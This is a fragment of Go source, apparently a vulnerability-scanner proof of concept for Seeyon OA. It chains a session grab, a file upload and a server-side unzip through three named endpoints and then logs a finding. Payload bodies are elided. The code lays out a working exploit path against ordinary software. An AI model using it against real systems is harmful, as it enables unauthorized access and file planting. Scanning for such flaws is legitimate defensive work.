	...
	if session := getsession(u); session != "" {
		if filename := upload(u, session); filename != "" {
			if unzip(u, filename, session) {
				log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon poc SessionUpload|%s\n", u))
				return true
			}
		}
	}
...
func getsession(u string) string {
	...
	if req, err := utils.HttpRequset(u+"/seeyon/thirdpartyController.do", "POST", data, false, header); err == nil {
...
func upload(u string, cookie string) string {
	...
	if req, err := utils.HttpRequset(u+"/seeyon/fileUpload.do?method=processUpload", "POST", buf.String(), false, header); err == nil {
...
func unzip(u string, filename string, cookie string) bool {
	...
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Cookie"] = cookie
	if req, err := utils.HttpRequset(u+"/seeyon/ajax.do", "POST", data, false, header); err == nil {
